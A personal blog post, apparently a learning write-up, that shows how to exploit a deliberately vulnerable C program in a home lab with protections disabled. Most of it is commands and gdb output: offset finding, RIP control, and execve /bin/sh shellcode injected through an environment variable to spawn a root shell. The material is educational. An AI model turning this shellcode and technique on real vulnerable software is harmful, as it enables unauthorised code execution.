---
title: "Spawning Shells through Buffer Overflows"
excerpt: A step-by-step analysis of how one can exploit vulnerable programs to spawn a shell out of thin air. 
date: 2025-11-06
---

Some time ago a had an interesting conversation with a colleague who studies cybersecurity: as part of his homework, he explained, he was supposed to abuse buffer-overflows in vulnerable executables or functions at a very low-level in order to spawn a shell seemingly out of nowhere! 

This sounded interesting to me, as he elaborated on some details about registers and stacks which I was roughly able to follow, in part due to the things I learned ever since I sparked an interest in malware analysis and have been going over lots of theory and different rooms, for instance this [Malware Analysis](https://tryhackme.com/module/malware-analysis) room on TryHackMe.

Thus, the goal of this post is to recreate one of these types of vulnerabilities

Since I'm not 100% fluent in the language of assembly and stack frames yet, this challenge also served as a way to familiarise myself more with all of these concepts and workflows. To guarantee a steep learning-curve, I followed [this](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow) blog post from the Red Team Notes.


## 1 Vulnerable Program

First and foremost, we will discuss the vulnerable piece of code that we will exploit in this task:
```c
// code from https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/

#include <stdio.h>
#include <unistd.h>

int vuln() {
    char buf[80];
    int r;
    r = read(0, buf, 400);
    printf("\nRead %d bytes. buf is %s\n", r, buf);
    puts("No shell for you :(");
    return 0;
}

int main(int argc, char *argv[]) {
    printf("Try to exec /bin/sh");
    vuln();
    return 0;
}
```
Roughly speaking, the program prints a message, reads user input, prints how many bytes it read and the input, then prints a cheeky message and exits. If we look more precisely, it first allocates an 80-byte array `buf` on the stack, before writing a given user input into `buf` with the `read` function. 

Notice that `read(0, buf, 400)` tells the system to read up to 400 bytes from file descriptor `0` (standard input) into memory. This will overwrite the stack's contents, specifically, the RBP and the return address, which we can and will be exploit in this challenge.

We compile the code with the following command:
```console
┌──(root㉿kali)-[/home/kali/projects/bin-exploits]
└─# gcc -fno-stack-protector -z execstack vulnerable.c -o vulnerable
```
The specific options are explained below:
- `-fno-stack-protector`: Tells the compiler not to emit stack-protector code (no stack canaries). Normally, compilers add guard values (“canaries”) around local buffers and check them before returning from functions; if a buffer overflow overwrites the canary, the program aborts. This flag removes that protection so a buffer overflow can overwrite return addresses without being detected by the canary check.
- `-z execstack`: Passed to the linker; requests that the generated ELF binary have an executable stack. On many systems the default is a non-executable stack (NX / DEP), in which case it is often times not as easy to exploit a buffer-overflow.

Compiling our code with these options set is obviously much more insecure. However, for the purpose of this lab this is very much helpful.

Before we run `vulnerable`, we need to make sure that ASLR (Address Space Layout Randomization) is turned off, so studying the virtual addresses later on becomes easier. Generally, its numeric value controls how aggressively the kernel randomizes virtual address space layout for new processes, where 0 = no randomization, 1 = conservative randomization and 2 = full randomization. Run the command
```console
┌──(root㉿kali)-[/home/kali/projects/bin-exploits]
└─# echo 0 > /proc/sys/kernel/randomize_va_space
```
to turn ASLR off.

Now if we run the program normally, it simply allows for the user input, returns a cheeky message and terminates the process:
```console
┌──(root㉿kali)-[/home/kali/projects/bin-exploits]
└─# ./vulnerable
Here is some input!
Try to exec /bin/sh
Read 20 bytes. buf is Here is some input!

No shell for you :(
```


## Technical Analysis

The goal of this chapter is to gain control of the RIP register.

But first: why do we need to control this particular register in the first place? The answer is that RIP is the **R**esgister **I**nstruction **P**ointer, i.e. it tells the CPU which instruction to execute next. If we control the value of RIP, then we might 'abuse' the CPU to execute malicious code.

Since we know about the bug, let's try to force a buffer-overflow by passing a very long string into the user input. First, we create the garbage string and write it into a file:
```console
┌──(root㉿kali)-[/home/kali/projects/bin-exploits]
└─# python3 -c "import sys; sys.stdout.write('A'*200)" > trash.bin
                                                                                                                                             
┌──(root㉿kali)-[/home/kali/projects/bin-exploits]
└─# cat trash.bin 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
```
We will use `gdb` (Gnu Debugger) to analyse the vulnerable exectable, more precisely `gnu-peda` for a better user interface:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/d17b230d-f5f9-4e96-85a6-0e3ebf7acd83"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

Notice that we open the file with `gdb vulnerable` and then actually run the program with the garbage input in the line that reads `gdb-peda$ r < trash.bin`. We observe the following key points:
- The stack has been overflowed with 'A's, as can be seen in the lines that read
    ```console
    RBP: 0x4141414141414141 ('AAAAAAAA')
    ```
  and
    ```console
    0000| 0x7fffffffe0f8 ('A' <repeats 96 times>, "8\342\377\377\377\177")
    0008| 0x7fffffffe100 ('A' <repeats 88 times>, "8\342\377\377\377\177")
    0016| 0x7fffffffe108 ('A' <repeats 80 times>, "8\342\377\377\377\177")
    0024| 0x7fffffffe110 ('A' <repeats 72 times>, "8\342\377\377\377\177")
    0032| 0x7fffffffe118 ('A' <repeats 64 times>, "8\342\377\377\377\177")
    0040| 0x7fffffffe120 ('A' <repeats 56 times>, "8\342\377\377\377\177")
    0048| 0x7fffffffe128 ('A' <repeats 48 times>, "8\342\377\377\377\177")
    0056| 0x7fffffffe130 ('A' <repeats 40 times>, "8\342\377\377\377\177")
    ```
- It seems as though the RIP (`RIP: 0x5555555551ac (<vuln+83>: ret)`) has not been overflowed
- `gdb` shows the stop location at the ret instruction: `RIP: 0x5555555551ac (<vuln+83>: ret)` — this is the instruction that attempted to return and triggered the crash.

So why is RIP not overflowed? To quote the blog post I am working with:

> The reason the RIP was not overflowed, is because the 'AAAAAAAA' (`0x4141414141414141`) is considered a non-canonical memory address, or, in other words, `0x4141414141414141` is a 64-bit wide address and current CPUs prevent applications and OSes to use 64-bit wide addresses.
>
> Instead, the highest memory addresses programs can use are 48-bit wide addresses and they are capped to `0x00007FFFFFFFFFFF`. This is done to prevent the unnecessary complexity in memory address translations that would not provide much benefit to the OSes or applications as it's very unlikely they would ever need to use all of that 64-bit address space.


#### Finding RIP Offset

Now that we know about canonical memory addresses, we should try to convert the non-canonical address `0x4141414141414141` to a canonical one by masking of the two highest bytes, so we get the 48-bit address. To be precise, we perform a bit-wise AND operation as follows:
```text
0x4141414141414141 & 0x00007FFFFFFFFFFF = 0x0000414141414141
```
So let's see if we can make the program crash and point the RIP to the now canonical memory address `0x0000414141414141`.

Before we do so, we first need to find out exactly how much 'garbage', i.e. `AAAAA...`, we need to send onto the stack before the overflow happens, to we can point the RIP to the modified address. Using `gdb-peda` we can create a string of 200 characters:
```console
gdb-peda$ pattern_create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
```
We replace the content of `trash.bin` with this new string and then feed this into the vulnerable program with
```console
gdb-peda$ r < trash.bin
```
A part of the output looks like this:
```console
.
.
.
[-------------------------------------code-------------------------------------]
   0x5555555551a1 <vuln+72>:    call   0x555555555030 <puts@plt>
   0x5555555551a6 <vuln+77>:    mov    eax,0x0
   0x5555555551ab <vuln+82>:    leave
=> 0x5555555551ac <vuln+83>:    ret
   0x5555555551ad <main>:       push   rbp
   0x5555555551ae <main+1>:     mov    rbp,rsp
   0x5555555551b1 <main+4>:     sub    rsp,0x10
   0x5555555551b5 <main+8>:     mov    DWORD PTR [rbp-0x4],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe0f8 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\342\377\377\377\177")
0008| 0x7fffffffe100 ("AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\342\377\377\377\177")
0016| 0x7fffffffe108 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\342\377\377\377\177")
0024| 0x7fffffffe110 ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\342\377\377\377\177")
0032| 0x7fffffffe118 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\342\377\377\377\177")
0040| 0x7fffffffe120 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\342\377\377\377\177")
0048| 0x7fffffffe128 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\342\377\377\377\177")
0056| 0x7fffffffe130 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\342\377\377\377\177")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00005555555551ac in vuln ()

gdb-peda$ pattern_offset A7AAMAAiAA8
A7AAMAAiAA8 found at offset: 104
```
We can see that part of our pattern, i.e. `A7AAMAAiA...`, is visible at the top of the stack. This value would be popped from the stack and jumped to by the `ret` instruction. Now it remains to find out how many characters of the 200 bytes pattern that we generated earlier were put on the stack, before the string `A7AAMAAiA...` got placed at the top of the stack. This is done with the command `pattern_offset A7AAMAAiAA8` in `gdb-peda`, as can be seen above.


#### Controlling RIP

Now we have all the information to control RIP. To this end, let's overwrite the content of `trash.bin` with a string of 104 'A's and then the canonical return address `0x0000414141414141` (reversed, due to little-endianness):
```console
┌──(root㉿kali)-[/home/kali/projects/bin-exploits]
└─# python3 -c 'import sys; sys.stdout.buffer.write(b"A"*104 + b"\x41\x41\x41\x41\x41\x41\x00\x00")' > trash.bin
```
Now if we run the vulnerable program again, we find that RIP reflects precisely the canonical return address, which means we can control the pointer!
```console
gdb-peda$ r < trash.bin
Starting program: /home/kali/projects/bin-exploits/vulnerable < trash.bin
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Try to exec /bin/sh
Read 112 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp
No shell for you :(

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x7fffffffe228 --> 0x7fffffffe4fa ("/home/kali/projects/bin-exploits/vulnerable")
RCX: 0x0 
RDX: 0x0 
RSI: 0x5555555592a0 ("No shell for you :(\nRead 112 bytes. buf is ", 'A' <repeats 92 times>, "p\n")
RDI: 0x7ffff7f987b0 --> 0x0 
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffe100 --> 0x7fffffffe228 --> 0x7fffffffe4fa ("/home/kali/projects/bin-exploits/vulnerable")
RIP: 0x414141414141 ('AAAAAA')
R8 : 0x0 
R9 : 0x0 
R10: 0x0 
R11: 0x202 
R12: 0x0 
R13: 0x7fffffffe238 --> 0x7fffffffe526 ("COLORTERM=truecolor")
R14: 0x7ffff7ffd000 --> 0x7ffff7ffe310 --> 0x555555554000 --> 0x10102464c457f 
R15: 0x555555557dd8 --> 0x555555555110 (<__do_global_dtors_aux>:        endbr64)
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
.
.
.
```


#### Exploitation and Spawning a Shell

Now that we have full control over RIP, it 'only' remains to point to the address that gives us a shell. Unfortuately, there is a bit more work to do. We will place the [shellcode](http://shell-storm.org/shellcode/files/shellcode-806.php) in the environment variable `PWN`, so it ends up in the vulnerable program's stack when it's executed.
```console
┌──(root㉿kali)-[/home/kali/projects/bin-exploits]
└─# export PWN=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")')
```
Next, we use an external script which helps us locate the `PWN` variable on the stack when we execute the vulnerable program:
```c
// code by Jon Erickson, page 147 and 148 of Hacking: The Art of Exploitation, 2nd Edition

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
	char *ptr;

	if(argc < 3) {
		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
		exit(0);
	}
	ptr = getenv(argv[1]); /* get env var location */
	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
	printf("%s will be at %p\n", argv[1], ptr);
}
```
We save this code as `getenvvar.c` and compile/run as follows:
```console
┌──(root㉿kali)-[/home/kali/projects/bin-exploits]
└─# gcc getenvvar.c -o getenvvar

┌──(root㉿kali)-[/home/kali/projects/bin-exploits]
└─# ./getenvvar PWN ./vulnerable
PWN will be at 0x7fffffffef9f
```
Now we are ready to spawn a shell. All we have to do is replace the canonical return address from earlier with the address of `PWN` (remember to mask off the two highest bytes!) and then feed this into the vulnerable program. We can do so as a one-liner, namely:
```console
┌──(root㉿kali)-[/home/kali/projects/bin-exploits]
└─# ( python3 -c 'import sys; sys.stdout.buffer.write(b"A"*104 + b"\x9f\xef\xff\xff\xff\x7f\x00\x00")' ; cat ) | ./vulnerable
Try to exec /bin/sh
Read 112 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp
No shell for you :(
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```
Notice that we get the same output as earlier, when we ran `vulnerable` normally. However, now the program does not terminate and we can run the usual PoC command like `whoami` and `id`. Moreover, we have a root-shell, but this is only due to the fact that we worked as root throughout the whole lab, so this is nothing too impressive.

To me this is pretty cool. It feels like magic, modifying a seemingly harmless executable to spawn a shell out of nowhere!
